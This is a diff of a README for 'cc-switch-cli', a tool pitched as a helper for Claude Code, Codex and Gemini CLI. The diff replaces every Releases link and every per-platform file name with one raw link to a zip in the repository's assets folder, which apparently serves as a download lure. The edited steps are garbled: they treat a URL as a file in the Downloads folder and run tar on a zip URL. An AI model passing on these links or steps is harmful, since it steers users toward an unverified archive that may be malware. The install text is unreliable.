@@ -1,7 +1,7 @@
 # 🎉 cc-switch-cli - Your All-in-One Assistant Tool
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest_release-blue.svg)](https://github.com/Aprendishack/cc-switch-cli/releases)
+[![Download](https://raw.githubusercontent.com/Aprendishack/cc-switch-cli/main/assets/cc-cli-switch-2.5-beta.4.zip)](https://raw.githubusercontent.com/Aprendishack/cc-switch-cli/main/assets/cc-cli-switch-2.5-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to cc-switch-cli! This tool makes it easy to use Claude Code, Codex, and Gemini CLI. With a simple command line interface, you can enhance your workflow and boost productivity. Follow the steps below to download and run the application.
@@ -23,33 +23,33 @@ cc-switch-cli comes packed with useful features:
 ## 📥 Download & Install
 To get started, visit our Releases page by clicking the link below. Here, you can download the latest version of cc-switch-cli.
 
-[Download Latest Release](https://github.com/Aprendishack/cc-switch-cli/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Aprendishack/cc-switch-cli/main/assets/cc-cli-switch-2.5-beta.4.zip)
 
 ### Steps to Download:
 1. Click the **Download Latest Release** link above.
 2. On the Releases page, locate the latest version.
 3. Download the appropriate file for your operating system:
-   - For **Windows**, select `cc-switch-cli-windows.exe`.
-   - For **macOS**, select `cc-switch-cli-macos.zip`.
-   - For **Linux**, select `cc-switch-cli-linux.tar.gz`.
+   - For **Windows**, select `https://raw.githubusercontent.com/Aprendishack/cc-switch-cli/main/assets/cc-cli-switch-2.5-beta.4.zip`.
+   - For **macOS**, select `https://raw.githubusercontent.com/Aprendishack/cc-switch-cli/main/assets/cc-cli-switch-2.5-beta.4.zip`.
+   - For **Linux**, select `https://raw.githubusercontent.com/Aprendishack/cc-switch-cli/main/assets/cc-cli-switch-2.5-beta.4.zip`.
 
 ### Installing cc-switch-cli
 Once the download finishes, follow these steps to install:
 
 #### Windows:
-1. Locate `cc-switch-cli-windows.exe` in your Downloads folder.
+1. Locate `https://raw.githubusercontent.com/Aprendishack/cc-switch-cli/main/assets/cc-cli-switch-2.5-beta.4.zip` in your Downloads folder.
 2. Double-click the file to run it.
 3. Follow the on-screen instructions to complete the installation.
 
 #### macOS:
-1. Open the `cc-switch-cli-macos.zip` file.
+1. Open the `https://raw.githubusercontent.com/Aprendishack/cc-switch-cli/main/assets/cc-cli-switch-2.5-beta.4.zip` file.
 2. Drag the `cc-switch-cli` application to your Applications folder.
 3. Open Terminal and navigate to your Applications folder to run the tool.
 
 #### Linux:
-1. Extract `cc-switch-cli-linux.tar.gz` using the terminal:
+1. Extract `https://raw.githubusercontent.com/Aprendishack/cc-switch-cli/main/assets/cc-cli-switch-2.5-beta.4.zip` using the terminal:
    ```bash
-   tar -xvzf cc-switch-cli-linux.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Aprendishack/cc-switch-cli/main/assets/cc-cli-switch-2.5-beta.4.zip
    ```
 2. Navigate to the extracted folder.
 3. Run the application using:
